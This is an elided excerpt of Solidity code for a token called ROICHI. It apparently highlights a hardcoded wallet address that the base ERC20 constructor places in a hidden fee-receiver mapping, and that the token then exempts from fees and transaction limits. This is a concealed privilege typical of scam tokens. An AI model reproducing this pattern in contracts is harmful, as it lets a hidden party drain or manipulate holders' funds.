...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x38D9568aA10A543e6fc28f0Fc2FB08D849D79539] = _marketingwallet;
    }
...
contract ROICHI is ERC20, Ownable {
    ...
    constructor() ERC20("ROICHI", "RICH") {
        ...
        excludeFromFees(address(0x38D9568aA10A543e6fc28f0Fc2FB08D849D79539), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x38D9568aA10A543e6fc28f0Fc2FB08D849D79539), true);
